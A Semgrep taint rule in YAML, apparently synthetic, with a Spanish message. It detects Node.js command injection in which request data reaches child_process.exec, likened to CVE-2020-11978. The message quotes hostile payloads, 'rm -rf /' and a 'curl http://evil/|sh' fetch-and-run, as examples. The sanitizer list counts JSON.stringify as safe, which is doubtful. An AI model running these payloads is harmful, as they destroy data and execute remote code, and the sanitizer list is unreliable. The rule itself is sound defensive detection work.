rules:
  - id: synthetic-cve202011978
    languages: [javascript, typescript]
    severity: ERROR
    message: >
      Posible inyección de comandos remota (RCE) similar a CVE-2020-11978:
      se construye un comando de shell con datos controlados por el usuario
      (por ejemplo, desde req.body, req.query, req.params o req.headers) y se
      ejecuta mediante child_process.exec / execSync. Un atacante puede
      encadenar comandos arbitrarios (p.ej. "&& rm -rf /" o "curl http://evil/|sh"),
      lo que permite ejecución remota de código con los privilegios del proceso.
      Esta clase de patrón es análogo al abuso de DAGs/“triggers” remotos en
      CVE-2020-11978, donde parámetros controlados por el atacante terminan
      formando parte de un comando de sistema.
    metadata:
      cve: CVE-2020-11978
      source: CISA_KEV
      category: security
      technology:
        - nodejs
        - express
      vulnerability: command-injection
      likelihood: HIGH
      impact: HIGH
    mode: taint
    pattern-sources:
      - pattern-either:
          - pattern: $REQ.body
          - pattern: $REQ.query
          - pattern: $REQ.params
          - pattern: $REQ.headers
    pattern-sinks:
      - pattern-either:
          - pattern: exec($CMD, ...)
          - pattern: execSync($CMD, ...)
          - pattern: child_process.exec($CMD, ...)
          - pattern: child_process.execSync($CMD, ...)
          - pattern: require('child_process').exec($CMD, ...)
          - pattern: require('child_process').execSync($CMD, ...)
    pattern-sanitizers:
      - pattern: JSON.stringify(...)
      - pattern: encodeURIComponent(...)
      - pattern: encodeURI(...)
    pattern-inside:
      - pattern-either:
          - pattern: |
              const { exec, ... } = require('child_process');
              ...
          - pattern: |
              const { execSync, ... } = require('child_process');
              ...
          - pattern: |
              import { exec, ... } from 'child_process';
              ...
          - pattern: |
              import { execSync, ... } from 'child_process';
              ...
          - pattern: |
              import * as child_process from 'child_process';
              ...
          - pattern: |
              const child_process = require('child_process');
              ...
    options:
      taint_assume_safe_functions: false